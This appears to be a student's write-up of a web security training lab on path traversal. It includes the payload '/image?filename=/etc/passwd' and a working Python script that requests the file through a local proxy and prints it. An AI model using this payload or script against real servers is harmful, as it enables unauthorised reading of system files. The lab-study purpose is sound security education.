This lab contains a path traversal vulnerability in the display of product images.

The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

---

**Goal:** Exploit a path traversal vulnerability in the display of product images. Retrieve the contents of the `/etc/passwd` file.

**Analysis:** The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory, meaning i can replace the image file `/image?filename=56.jpg` with `/image?filename=/etc/passwd` and it will retrieve it. 

![[Pasted image 20240827164208.png]]

**Payload:** 

```php
/image?filename=/etc/passwd
```

**Script:**

```python
#!/usr/bin/python3

import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def path_attack(url):
	get_file = url + '/image?filename=/etc/passwd'
	r = requests.get(get_file, verify=False, proxies=proxies)
	if 'root' in r.text:
		print('(+) Exploit worked!\n(+) Printing contents of /etc/passwd')
		print(r.text)

def main():
	if len(sys.argv) != 2:
		print('(+) Usage: %s <URL>' % sys.argv[0])
		print('(+) Example: %s www.example.com' % sys.argv[0])
		sys.exit(-1)
		
	url = sys.argv[1]
	path_attack(url)

if __name__ == '__main__':
	main()
```

